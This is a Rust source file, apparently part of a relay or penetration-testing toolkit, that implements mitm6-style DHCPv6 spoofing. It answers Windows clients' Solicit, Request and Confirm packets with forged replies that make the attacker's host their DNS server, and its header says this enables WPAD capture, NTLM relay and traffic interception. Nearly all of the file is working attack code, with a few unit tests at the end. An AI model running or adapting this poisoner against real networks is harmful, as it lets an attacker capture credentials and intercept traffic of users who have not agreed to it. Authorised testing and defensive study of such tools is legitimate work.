//! mitm6 — DHCPv6 DNS Poisoning
//!
//! Implements IPv6 NBNS/DNS poisoning via DHCPv6 spoofing.
//! When a Windows client sends a DHCPv6 Solicit/Request, this module
//! replies with a spoofed DHCPv6 Advertise/Reply that assigns the
//! attacker's machine as the DNS server. The victim then uses the
//! attacker for DNS resolution, which enables:
//!   - WPAD proxy capture
//!   - NTLM authentication relay
//!   - General traffic interception

use crate::RelayError;
use std::net::{Ipv6Addr, SocketAddr, SocketAddrV6};
use tokio::net::UdpSocket;
use tokio::sync::watch;
use tokio::time::{Duration, sleep};
use tracing::{debug, info};

// ─────────────────────────────────────────────────────────────
// DHCPv6 Constants
// ─────────────────────────────────────────────────────────────

/// DHCPv6 client port
const DHCPV6_CLIENT_PORT: u16 = 546;
/// DHCPv6 server port
const DHCPV6_SERVER_PORT: u16 = 547;
/// All DHCPv6 servers multicast address
const DHCPV6_MULTICAST: &str = "ff02::1:2";

// DHCPv6 message types
const SOLICIT: u8 = 1;
const ADVERTISE: u8 = 2;
const REQUEST: u8 = 3;
const _DECLINE: u8 = 4;
const CONFIRM: u8 = 5;
const REPLY: u8 = 7;

// DHCPv6 option codes
const OPTION_IA_NA: u16 = 3;
const _OPTION_IA_ADDR: u16 = 5;
const OPTION_DNS_SERVERS: u16 = 23;
const OPTION_DOMAIN_LIST: u16 = 24;

// ─────────────────────────────────────────────────────────────
// Configuration
// ─────────────────────────────────────────────────────────────

/// Configuration for mitm6 DHCPv6 poisoning
#[derive(Debug, Clone)]
pub struct Mitm6Config {
    /// Interface to listen on (IP address)
    pub listen_ip: String,
    /// IPv6 address of the attacker's DNS server
    pub dns_server: String,
    /// DNS domain to serve (e.g., "corp.local")
    pub domain: String,
    /// IPv6 prefix for allocated addresses (default: fd00::/8)
    pub prefix: String,
}

impl Default for Mitm6Config {
    fn default() -> Self {
        Self {
            listen_ip: "::".to_string(),
            dns_server: "fe80::1".to_string(),
            domain: "corp.local".to_string(),
            prefix: "fd00".to_string(),
        }
    }
}

// ─────────────────────────────────────────────────────────────
// DHCPv6 Poisoner
// ─────────────────────────────────────────────────────────────

/// DHCPv6-based DNS poisoning engine.
/// Runs on `tokio` — the listener loop is spawned as a background `tokio::task`,
/// and cancellation is signalled via a `watch` channel. Dropping the `Mitm6`
/// handle automatically stops the listener.
pub struct Mitm6 {
    config: Mitm6Config,
    cancel_tx: Option<watch::Sender<bool>>,
    task_handle: Option<tokio::task::JoinHandle<()>>,
}

impl Mitm6 {
    /// Create a new mitm6 poisoner (not started yet).
    pub fn new(config: Mitm6Config) -> Self {
        Self {
            config,
            cancel_tx: None,
            task_handle: None,
        }
    }

    /// Start the DHCPv6 poisoner as a background `tokio` task.
    /// Returns immediately once the socket is bound. The listener runs until
    /// `stop()` is called or the `Mitm6` handle is dropped.
    pub async fn start(&mut self) -> Result<(), RelayError> {
        if self.cancel_tx.is_some() {
            return Err(RelayError::Config("mitm6 already running".into()));
        }

        info!(
            "Starting mitm6 DHCPv6 poisoner on {} with DNS {}",
            self.config.listen_ip, self.config.dns_server
        );

        let listen_addr = format!("[{}]:{}", self.config.listen_ip, DHCPV6_SERVER_PORT);
        let socket = UdpSocket::bind(&listen_addr)
            .await
            .map_err(|e| RelayError::Socket(format!("Cannot bind DHCPv6 port 547: {e}")))?;

        let multicast_addr: Ipv6Addr = DHCPV6_MULTICAST
            .parse()
            .expect("DHCPV6_MULTICAST is a valid hardcoded IPv6 address");
        if let Err(e) = socket.join_multicast_v6(&multicast_addr, 0) {
            // Non-fatal — some platforms require root for multicast
            debug!("Could not join DHCPv6 multicast group: {e}");
        } else {
            info!("Joined DHCPv6 multicast group: {DHCPV6_MULTICAST}");
        }

        let (cancel_tx, cancel_rx) = watch::channel(false);
        let config = self.config.clone();

        let task_handle = tokio::spawn(async move {
            mitm6_listener_loop(socket, config, cancel_rx).await;
        });

        self.cancel_tx = Some(cancel_tx);
        self.task_handle = Some(task_handle);

        info!("mitm6 DHCPv6 poisoner started");
        Ok(())
    }

    /// Signal the listener to stop and wait for it to finish.
    pub async fn stop(&mut self) {
        if let Some(tx) = self.cancel_tx.take() {
            let _ = tx.send(true);
        }
        if let Some(handle) = self.task_handle.take() {
            let _ = handle.await;
        }
        info!("mitm6 poisoner stopped");
    }

    /// Check if the listener task is still running.
    pub fn is_running(&self) -> bool {
        self.cancel_tx.is_some()
    }
}

impl Drop for Mitm6 {
    fn drop(&mut self) {
        if let Some(tx) = self.cancel_tx.take() {
            let _ = tx.send(true);
        }
        // JoinHandle will be detached on drop — that is acceptable for background tasks.
    }
}

// ─────────────────────────────────────────────────────────────
// Listener Loop (spawned as a tokio task)
// ─────────────────────────────────────────────────────────────

async fn mitm6_listener_loop(
    socket: UdpSocket,
    config: Mitm6Config,
    mut cancel_rx: watch::Receiver<bool>,
) {
    let mut buf = [0u8; 4096];
    loop {
        tokio::select! {
            biased;
            _ = cancel_rx.changed() => {
                if *cancel_rx.borrow() {
                    debug!("mitm6 listener received cancellation signal");
                    break;
                }
            }
            result = socket.recv_from(&mut buf) => {
                match result {
                    Ok((len, src)) => {
                        debug!("DHCPv6 packet from {} ({} bytes)", src, len);
                        if let Err(e) = handle_dhcpv6_packet(&buf[..len], src, &config, &socket).await {
                            debug!("DHCPv6 handler: {e}");
                        }
                    }
                    Err(e) => {
                        debug!("DHCPv6 recv error: {e}");
                        sleep(Duration::from_millis(100)).await;
                    }
                }
            }
        }
    }
    debug!("mitm6 listener loop exited");
}

// ─────────────────────────────────────────────────────────────
// DHCPv6 Packet Handling
// ─────────────────────────────────────────────────────────────

async fn handle_dhcpv6_packet(
    data: &[u8],
    src: SocketAddr,
    config: &Mitm6Config,
    socket: &UdpSocket,
) -> Result<(), RelayError> {
    if data.len() < 4 {
        return Ok(());
    }

    let msg_type = data[0];

    match msg_type {
        SOLICIT => {
            debug!("DHCPv6 SOLICIT from {src}");
            let tx_id = [data[1], data[2], data[3]];
            let reply = build_spoofed_advertise(&tx_id, config);
            send_dhcpv6_response(socket, &reply, src).await?;
            info!("Sent spoofed DHCPv6 ADVERTISE to {src}");
        }
        REQUEST => {
            debug!("DHCPv6 REQUEST from {src}");
            let tx_id = [data[1], data[2], data[3]];
            let reply = build_spoofed_reply(&tx_id, config);
            send_dhcpv6_response(socket, &reply, src).await?;
            info!("Sent spoofed DHCPv6 REPLY to {src}");
        }
        CONFIRM => {
            debug!("DHCPv6 CONFIRM from {src}");
            let tx_id = [data[1], data[2], data[3]];
            let reply = build_spoofed_reply(&tx_id, config);
            send_dhcpv6_response(socket, &reply, src).await?;
            info!("Sent spoofed DHCPv6 REPLY to {src}");
        }
        _ => {
            debug!("DHCPv6 type {} from {src} (ignored)", msg_type);
        }
    }

    Ok(())
}

async fn send_dhcpv6_response(
    socket: &UdpSocket,
    response: &[u8],
    dest: SocketAddr,
) -> Result<(), RelayError> {
    let client_addr = SocketAddrV6::new(
        match dest.ip() {
            std::net::IpAddr::V6(ip) => ip,
            _ => return Ok(()),
        },
        DHCPV6_CLIENT_PORT,
        0,
        0,
    );
    socket
        .send_to(response, SocketAddr::V6(client_addr))
        .await
        .map_err(|e| RelayError::Network(format!("DHCPv6 send: {e}")))?;
    Ok(())
}

// ─────────────────────────────────────────────────────────────
// DHCPv6 Packet Builders
// ─────────────────────────────────────────────────────────────

fn build_spoofed_advertise(tx_id: &[u8; 3], config: &Mitm6Config) -> Vec<u8> {
    let mut pkt = Vec::new();
    pkt.push(ADVERTISE);
    pkt.extend_from_slice(tx_id);

    let iaid = [0x00, 0x00, 0x00, 0x01];
    let t1 = 0u32.to_be_bytes();
    let t2 = 0u32.to_be_bytes();

    let mut ia_na_content = Vec::new();
    ia_na_content.extend_from_slice(&iaid);
    ia_na_content.extend_from_slice(&t1);
    ia_na_content.extend_from_slice(&t2);

    let ipv6_addr: Ipv6Addr = config.dns_server.parse().unwrap_or_else(|_| {
        let octets = [0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1];
        Ipv6Addr::from(octets)
    });

    ia_na_content.extend_from_slice(&build_ia_addr_option(&ipv6_addr));

    let ia_na_option = build_dhcpv6_option(OPTION_IA_NA, &ia_na_content);
    pkt.extend_from_slice(&ia_na_option);

    let dns_ip: Ipv6Addr = config.dns_server.parse().unwrap_or(ipv6_addr);
    let dns_option = build_dhcpv6_option(OPTION_DNS_SERVERS, &dns_ip.octets());
    pkt.extend_from_slice(&dns_option);

    let domain_bytes = encode_domain_name(&config.domain);
    let domain_option = build_dhcpv6_option(OPTION_DOMAIN_LIST, &domain_bytes);
    pkt.extend_from_slice(&domain_option);

    pkt
}

fn build_spoofed_reply(tx_id: &[u8; 3], config: &Mitm6Config) -> Vec<u8> {
    let mut pkt = Vec::new();
    pkt.push(REPLY);
    pkt.extend_from_slice(tx_id);

    let dns_ip: Ipv6Addr = config
        .dns_server
        .parse()
        .unwrap_or_else(|_| Ipv6Addr::new(0xfe80, 0, 0, 0, 0, 0, 0, 0x0001));
    let dns_option = build_dhcpv6_option(OPTION_DNS_SERVERS, &dns_ip.octets());
    pkt.extend_from_slice(&dns_option);

    let domain_bytes = encode_domain_name(&config.domain);
    let domain_option = build_dhcpv6_option(OPTION_DOMAIN_LIST, &domain_bytes);
    pkt.extend_from_slice(&domain_option);

    pkt
}

fn build_dhcpv6_option(code: u16, data: &[u8]) -> Vec<u8> {
    let mut option = Vec::with_capacity(4 + data.len());
    option.extend_from_slice(&code.to_be_bytes());
    option.extend_from_slice(&(data.len() as u16).to_be_bytes());
    option.extend_from_slice(data);
    option
}

fn build_ia_addr_option(addr: &Ipv6Addr) -> Vec<u8> {
    let mut option = Vec::with_capacity(28);
    option.extend_from_slice(&addr.octets());
    option.extend_from_slice(&0u32.to_be_bytes());
    option.extend_from_slice(&0u32.to_be_bytes());
    option
}

fn encode_domain_name(domain: &str) -> Vec<u8> {
    let mut encoded = Vec::new();
    for label in domain.split('.') {
        if label.is_empty() {
            continue;
        }
        encoded.push(label.len() as u8);
        encoded.extend_from_slice(label.as_bytes());
    }
    encoded.push(0);
    encoded
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_domain_encoding() {
        let encoded = encode_domain_name("corp.local");
        assert_eq!(encoded, b"\x04corp\x05local\x00");
    }

    #[test]
    fn test_build_dhcpv6_option() {
        let opt = build_dhcpv6_option(OPTION_DNS_SERVERS, &[0x00; 16]);
        assert_eq!(opt.len(), 20);
        assert_eq!(&opt[0..2], &23u16.to_be_bytes());
        assert_eq!(&opt[2..4], &16u16.to_be_bytes());
    }

    #[test]
    fn test_mitm6_config_default() {
        let cfg = Mitm6Config::default();
        assert_eq!(cfg.listen_ip, "::");
        assert_eq!(cfg.domain, "corp.local");
    }
}
